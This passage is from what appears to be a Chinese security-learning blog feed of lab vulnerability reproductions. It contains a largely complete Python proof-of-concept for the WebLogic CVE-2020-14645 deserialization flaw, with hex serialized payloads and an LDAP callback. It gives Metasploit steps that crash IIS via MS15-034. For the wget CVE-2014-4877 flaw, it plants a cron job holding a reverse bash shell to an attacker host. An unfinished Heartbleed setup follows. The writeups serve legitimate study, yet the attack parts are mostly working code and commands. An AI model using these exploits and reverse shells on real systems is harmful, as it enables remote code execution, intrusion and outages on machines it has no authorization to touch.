string">'000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371'</span>    data2 <span class="token operator">=</span> <span class="token string">'007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token string">'{:04x}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>rport<span class="token punctuation">)</span><span class="token punctuation">)</span>    data3 <span class="token operator">=</span> <span class="token string">'1a7727000d3234322e323134'</span>    data4 <span class="token operator">=</span> <span class="token string">'2e312e32353461863d1d0000000078'</span>    <span class="token keyword">for</span> d <span class="token keyword">in</span> <span class="token punctuation">[</span>data1<span class="token punctuation">,</span>data2<span class="token punctuation">,</span>data3<span class="token punctuation">,</span>data4<span class="token punctuation">]</span><span class="token punctuation">:</span>        sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">sendEvilObjData</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload<span class="token operator">=</span><span class="token string">'056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000'</span>    payload<span class="token operator">+=</span>data    payload<span class="token operator">+=</span><span class="token string">'fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'</span>    payload <span class="token operator">=</span> <span class="token string">'%s%s'</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token string">'{:08x}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>    sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        count <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">while</span> count<span class="token operator">&lt;</span><span class="token number">3</span><span class="token punctuation">:</span>            res <span class="token operator">+=</span> sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf8"</span><span class="token punctuation">,</span><span class="token string">"ignore"</span><span class="token punctuation">)</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>            count <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token keyword">return</span> res<span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>rip<span class="token punctuation">,</span>rport<span class="token punctuation">,</span>ldap<span class="token punctuation">)</span><span class="token punctuation">:</span>    sock <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    sock<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>    server_addr <span class="token operator">=</span> <span class="token punctuation">(</span>rip<span class="token punctuation">,</span> rport<span class="token punctuation">)</span>    t3handshake<span class="token punctuation">(</span>sock<span class="token punctuation">,</span>server_addr<span class="token punctuation">)</span>    buildT3RequestObject<span class="token punctuation">(</span>sock<span class="token punctuation">,</span>rport<span class="token punctuation">)</span>    sendEvilObjData<span class="token punctuation">(</span>sock<span class="token punctuation">,</span> payload<span class="token punctuation">(</span>ldap<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    ip <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    port <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    ldap<span class="token operator">=</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Poc CVE-2020-14645\n"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"target:%s port:%s ldap:%s"</span><span class="token operator">%</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span>port<span class="token punctuation">,</span>ldap<span class="token punctuation">)</span><span class="token punctuation">)</span>    run<span class="token punctuation">(</span>ip<span class="token punctuation">,</span>port<span class="token punctuation">,</span>ldap<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>攻击：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">python3 poc<span class="token punctuation">.</span>py 靶机IP 靶机端口号（一般为7001） <span class="token string">"ldap://攻击机IP/#exp"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>等待几秒钟，查看靶机，计算器被打开，说明攻击成功。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/liliyuanshangcao/p/13549992.html">https://www.cnblogs.com/liliyuanshangcao/p/13549992.html</a></li><li><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/av244028601/">https://www.bilibili.com/video/av244028601/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 远程代码执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ms15-034漏洞复现</title>
      <link href="2020/09/22/ms15-034-lou-dong-fu-xian/"/>
      <url>2020/09/22/ms15-034-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<p>远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞。 成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。</p><blockquote><p>这是我在实验室学习渗透测试所做的第十二个漏洞复现，较简单，只不过被参考博客（文章最后的第一个链接）中的一个小错误坑了一下，但很快就发现了问题所在。</p></blockquote><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>攻击机：Kali Linux 192.168.227.128</p><p>靶机：Windows Server 2008 R2 SP1 64位（IIS7）  192.168.227.142</p><p>漏洞影响范围见<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2015/ms15-034">此处</a>。</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><h3 id="1-靶机安装IIS"><a href="#1-靶机安装IIS" class="headerlink" title="1. 靶机安装IIS"></a>1. 靶机安装IIS</h3><p>右键“计算机”，选择“属性”，打开“服务器管理器”，在左侧选择“角色”，在右侧点击“添加角色”。在“添加角色向导”中可以看到有一个”Web服务器（IIS）”，勾选后点击“下一步”。</p><p>在选择角色服务时，勾选“HTTP重定向”和“FTP服务器”，其他地方不需要更改，下一步直到安装。</p><p>安装完成后，打开浏览器，在地址栏输入<code>http://127.0.0.1/</code>，若出现IIS7欢迎界面，说明安装成功。</p><h3 id="2-使用msf攻击"><a href="#2-使用msf攻击" class="headerlink" title="2. 使用msf攻击"></a>2. 使用msf攻击</h3><p>打开攻击机，在终端输入<code>curl http://靶机IP -H "Host: 靶机IP" -H "Range: bytes=0-18446744073709551615"</code>，如果看到”<strong>Requested Range Not Satisfiable</strong>“，说明存在该漏洞。</p><p><code>msfconsole</code>启动msf，查询ms15-034。结果有两个，在这里先使用第二个模块。选择该模块并配置需要的选项，只需要配置一下RHOSTS即可。配置完成过后，输入<code>exploit</code>读取内存信息。</p><p>以上都没有问题，使用第一个模块，设置好需要的选项后，输入<code>run</code>进行攻击。</p><p>查看靶机，已经蓝屏。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43886632/article/details/89304566">https://blog.csdn.net/weixin_43886632/article/details/89304566</a></li><li><a target="_blank" rel="noopener" href="https://baijiahao.baidu.com/s?id=1619475024793065417&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1619475024793065417&amp;wfr=spider&amp;for=pc</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 堆栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2014-4877漏洞复现</title>
      <link href="2020/09/22/cve-2014-4877-lou-dong-fu-xian/"/>
      <url>2020/09/22/cve-2014-4877-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><h3 id="1-wget简介"><a href="#1-wget简介" class="headerlink" title="1. wget简介"></a>1. wget简介</h3><p>wget是一个从网络上自动下载文件的自由工具，支持通过HTTP、HTTPS、FTP三个最常见的TCP/IP协议下载，并可以使用HTTP代理。wget名称的由来是”World Wide Web”与”get”的结合。</p><p>“递归下载”是wget提供的一个特性，我们平时使用浏览器进行网页浏览的时候，浏览器就是在进行递归下载，将我们输入的一个URL链接，已经它其中附带的CSS、IMG、HTML HREF等链接也一并下载下来并进行渲染</p><h3 id="2-CVE-2014-4877"><a href="#2-CVE-2014-4877" class="headerlink" title="2. CVE-2014-4877"></a>2. CVE-2014-4877</h3><p>Wget 处理符号链接的方式存在缺陷。恶意 FTP 服务器可能允许 Wget 在镜像模式下运行（使用’-m’命令行选项）将任意文件写入可由运行 Wget 的用户写入的位置，从而可能导致代码执行。</p><p>攻击者通过操纵ftp服务器可以在wget用户端环境创建任意的文件、目录以及链接。通过符号链接攻击，攻击者以wget的运行权限访问客户端整个文件系统，覆盖文件内容(包括二进制文件)。这个漏洞还能通过系统的cron设置或用户级别的(bash profile, SSH authorized_keys)设置触发远程代码执行</p><blockquote><p>这是我在实验室学习渗透测试的所做的第十一个漏洞复现，用时超长……主要是网上能够搜集到的资料基本都是2014年的（漏洞发现的年份），许多东西今天已经不再适用，而且大多数博客描述也不太清楚，让我这个菜鸟无从下手。什么“文件不存在啊”、”connection: 192.168.227.128:4444 –&gt; 192.168.227.128:xxxxx”都踩雷了，不过在小杰学长的帮助下，最终还是顺利解决啦！小杰学长果然是那种人狠话不多的角色啊……</p></blockquote><p>废话不多说，开始复现！</p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>服务端：Kali Linux 192.168.227.128</p><p>客户端：Ubuntu 192.168.227.141</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><h3 id="1-安装vsftpd"><a href="#1-安装vsftpd" class="headerlink" title="1. 安装vsftpd"></a>1. 安装vsftpd</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># 安装vsftpd</span>apt<span class="token operator">-</span>get install vsftpd<span class="token comment"># 将FTP使用的端口开放出去</span>iptables <span class="token operator">-</span>A INPUT <span class="token operator">-</span>p tcp <span class="token operator">--</span>dport 21 <span class="token operator">-</span>j ACCEPT<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>打开<code>/etc/vsftpd.conf</code>，修改以下内容：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># 修改</span><span class="token assign-left variable">listen</span><span class="token operator">=</span>YES<span class="token assign-left variable">listen_ipv6</span><span class="token operator">=</span>NO<span class="token assign-left variable">anonymous_enable</span><span class="token operator">=</span>YES<span class="token assign-left variable">write_enable</span><span class="token operator">=</span>YES<span class="token comment"># 添加一句，用来设置fpt的默认文件夹</span><span class="token assign-left variable">anon_root</span><span class="token operator">=</span>/var/ftp <span class="token comment"># 可以更改</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一切完成后，输入<code>/etc/init.d/vsftpd restart</code>重启服务。</p><h3 id="2-软链接-符号链接-下载漏洞POC"><a href="#2-软链接-符号链接-下载漏洞POC" class="headerlink" title="2. 软链接(符号链接)下载漏洞POC"></a>2. 软链接(符号链接)下载漏洞POC</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token builtin class-name">cd</span> /var/ftp<span class="token function">ln</span> -s /etc/passwd steal<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>打开另一台ubuntu虚拟机，输入<code>wget -V</code>查看wget版本（漏洞存在于wget1.16之前的版本中）。如果版本过高，则卸载后在<a target="_blank" rel="noopener" href="http://mirrors.aliyun.com/gnu/wget/">这里</a>安装较低版本的wget。但是若本机openssl版本过高（1.1.x），则无法正常安装，除了卸载当前openssl安装低版本的openssl（1.0.x），我没有找到有效的解决方法（网上有人提供了一些补丁，我试了下没有效果）。</p><p>目前来看，似乎只有ubuntu作为客户端才能正常复现该漏洞，Centos7则会一直显示软链接的文件不存在，不知道是什么原因。</p><p>wget安装完成后，使用wget以递归模式向服务端发起对这个符号链接文件的下载请求。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">wget</span> ftp://服务端IP/steal -r<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看客户端的steal文件，与服务端的文件比较，可以发现该文件并不是从服务端下载的文件，而是在本地相同位置（/etc/passwd）创建了一个软链接。</p><h3 id="3-使用MSF进行远程代码攻击"><a href="#3-使用MSF进行远程代码攻击" class="headerlink" title="3. 使用MSF进行远程代码攻击"></a>3. 使用MSF进行远程代码攻击</h3><p>使用msfvenom生成反连shell的payload代码。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p cmd/unix/reverse_bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>随便找一个目录，创建一个cronshell文件，将上面得到的payload代码（最后一行的字符串）写入cronshell。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin* * * * * root <span class="token function">bash</span> -c <span class="token string">'0&lt;&amp;143-;exec 143&lt;&gt;/dev/tcp/192.168.227.128/4444;sh &lt;&amp;143 &gt;&amp;143 2&gt;&amp;143'</span><span class="token punctuation">;</span> <span class="token function">rm</span> -f /etc/cron.d/cronshellEOD<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在cronshell所在目录下打开msf，监听本地端口。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">use exploit/multi/handler<span class="token builtin class-name">set</span> PAYLOAD cmd/unix/reverse_bash<span class="token builtin class-name">set</span> LHOST 本机IP<span class="token builtin class-name">set</span> LPORT <span class="token number">4444</span>run -j<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后，切换到wget模块本身。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">use auxiliary/server/wget_symlink_file_write<span class="token builtin class-name">set</span> TARGET_FILE /etc/cron.d/cronshell <span class="token comment"># 在客户端的/etc/cron.d目录下生成cronshell文件</span><span class="token builtin class-name">set</span> TARGET_DATA file:cronshell <span class="token comment"># 客户端的文件内容为当前目录下的cronshell内的内容</span><span class="token builtin class-name">set</span> SRVPORT <span class="token number">21</span>run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>之后回到客户端，在root权限下，输入<code>wget -m ftp://服务端IP:21</code>，下载文件。</p><p>下载成功后，可以在服务端看到相应的结果。等待第一个监听模块收集到session。可以输入命令验证是否攻击成功。</p><p>同时，在客户端的/etc/cron.d目录下也可以看到我们发送过来的cronshell文件。</p><p>也可以写一个python3脚本，直接运行python3脚本即可（需要重新生成payload代码，并写入cronshell）。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">def</span> <span class="token function">Handler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    configFile <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./wget_symlink_file_write.rc'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span>    configFile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'use exploit/multi/handler\n'</span><span class="token punctuation">)</span>    <span class="token comment">#configFile.write('set LHOST %s\n'%self.lprot)</span>    configFile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'set PAYLOAD cmd/unix/reverse_bash\n'</span><span class="token punctuation">)</span>    configFile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'set LHOST 192.168.227.128\n'</span><span class="token punctuation">)</span>    configFile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'set LPORT 4444\n'</span><span class="token punctuation">)</span>    configFile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'run -j\n'</span><span class="token punctuation">)</span>    configFile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'use auxiliary/server/wget_symlink_file_write\n'</span><span class="token punctuation">)</span>    configFile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'set TARGET_FILE /etc/cron.d/cronshell\n'</span><span class="token punctuation">)</span>    configFile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'set TARGET_DATA file:cronshell\n'</span><span class="token punctuation">)</span>    configFile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'set SRVPORT 21\n'</span><span class="token punctuation">)</span>    configFile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'run\n'</span><span class="token punctuation">)</span>    <span class="token comment">#configFile.write('exploit\n')</span>    configFile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'msfconsole -r ./wget_symlink_file_write.rc'</span><span class="token punctuation">)</span>    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'rm ./wget_symlink_file_write.rc'</span><span class="token punctuation">)</span>    Handler<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果如图（截图里我在靶机下载文件后，没等cronshell运行就输入了<code>sessions</code>，因此是<code>No active sessions</code>，不过根据后面的结果可以看到是成功了的）：</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a target="_blank" rel="noopener" href="https://blog.rapid7.com/2014/10/28/r7-2014-15-gnu-wget-ftp-symlink-arbitrary-filesystem-access/">https://blog.rapid7.com/2014/10/28/r7-2014-15-gnu-wget-ftp-symlink-arbitrary-filesystem-access/</a></li><li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LittleHann/p/4101775.html">https://www.cnblogs.com/LittleHann/p/4101775.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 任意代码执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Heartbleed（心脏出血）漏洞复现</title>
      <link href="2020/09/15/heartbleed-xin-zang-chu-xie-lou-dong-fu-xian/"/>
      <url>2020/09/15/heartbleed-xin-zang-chu-xie-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<p>心脏出血（英语：Heartbleed），也简称为心血漏洞，是一个出现在加密程序库OpenSSL的安全漏洞，该程序库广泛用于实现互联网的传输层安全（TLS）协议。它于2012年被引入了软件中，2014年4月首次向公众披露。只要使用的是存在缺陷的OpenSSL实例，无论是服务器还是客户端，都可能因此而受到攻击。此问题的原因是在实现TLS的心跳扩展时没有对输入进行适当验证（缺少边界检查），因此漏洞的名称来源于“心跳”（heartbeat）。该程序错误属于缓冲区过读，即可以读取的数据比应该允许读取的还多。</p><p>Heartbleed漏洞是由于未能在memcpy()调用受害用户输入内容作为长度参数之前正确进行边界检查。攻击者可以追踪OpenSSL所分配的64KB缓存、将超出必要范围的字节信息复制到缓存当中再返回缓存内容，这样一来受害者的内存内容就会以每次64KB的速度进行泄露。</p><blockquote><p>这是我在实验室学习渗透测试所做的第十个漏洞复现，中间出现了两个棘手的问题，但现在看起来也都是一些低级错误。</p></blockquote><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>攻击机：Kali Linux</p><p>靶机：CentOS7</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><h3 id="1-安装OpenSSL-1-0-1"><a href="#1-安装OpenSSL-1-0-1" class="headerlink" title="1. 安装OpenSSL 1.0.1"></a>1. 安装<a target="_blank" rel="noopener" href="https://www.openssl.org/source/old/1.0.1/">OpenSSL 1.0.1</a></h3><p>首先查看靶机openssl的版本，Heartbleed漏洞影响的openssl版本主要有1.0.1，1.0.1a，1.0.1b，1.0.1c，1.0.1d，1.0.1e，1.0.1f，Beta 1 of OpenSSL 1.0.2等。如果版本不符合，则卸载原版本后前往官网下载老版本。</p><p>网络上有不少博客说使用<code>yum remove openssl</code>后会出问题，我一开始没敢尝试，后来试了一下，又安装1.0.1版本，结果<code>openssl version</code>显示的仍为原来的高版本。再后来重置了一下CentOS7，再使用<code>yum remove openssl</code>后没出现问题。原来出问题可能是我在卸载原来的openssl之前就试图安装1.0.1版本的openssl，结果需要的版本没成功安装上，原来的也因为部分文件覆盖而出了什么问题。</p><h3 id="2-关闭靶机防火墙和selinux"><a href="#2-关闭靶机防火墙和selinux" class="headerlink" title="2. 关闭靶机防火墙和selinux"></a>2. 关闭靶机防火墙和selinux</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># 关闭selinux</span>vi <span class="token operator">/</span>etc<span class="token operator">/</span>selinux<span class="token operator">/</span>config<span class="token comment"># 打开该文件后，将"SELINUX=xx"改为"SELINUX=disabled"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>修改完成后重启靶机，<code>/usr/sbin/sestatus -v</code>查看selinux状态。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># 关闭防火墙</span>systemctl stop firewalld<span class="token punctuation">.</span>service <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="3-靶机安装docker-compose"><a href="#3-靶机安装docker-compose" class="headerlink" title="3. 靶机安装docker-compose"></a>3. 靶机安装docker-compose</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># 安装</span>curl <span class="token operator">-</span>L <span class="token string">"https://github.com/docker/compose/releases/download/1.24.1/docker-compose-<span class="token function">$<span class="token punctuation">(</span>uname <span class="token operator">-</span>s<span class="token punctuation">)</span></span>-<span class="token function">$<span class="token punctuation">(</span>uname <span class="token operator">-</span>m<span class="token punctuation">)</span></span>"</span> <span class="token operator">-</span>o <span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>bin<span class="token operator">/</span>docker<span class="token operator">-</span>compose<span class="token comment"># 将可执行权限应用于二进制文件</span>chmod <span class="token operator">+</span>x <span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>bin<span class="token operator">/</span>docker<span class="token operator">-</span>compose<span class="token comment"># 创建软链</span>ln <span class="token operator">-</span>s <span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>bin<span class="token operator">/</span>docker<span class="token operator">-</span>compose <span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>docker<span class="token operator">-</span>compose<span class="token comment"># 检查是否安装成功</span>docker<span class="token operator">-</span>compose <span class="token operator">--</span>version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-配置docker-compose运行环境"><a href="#4-配置docker-compose运行环境" class="headerlink" title="4. 配置docker-compose运行环境"></a>4. 配置docker-compose运行环境</h3><p>我最开始参考的<a target="_blank" rel="noopener" 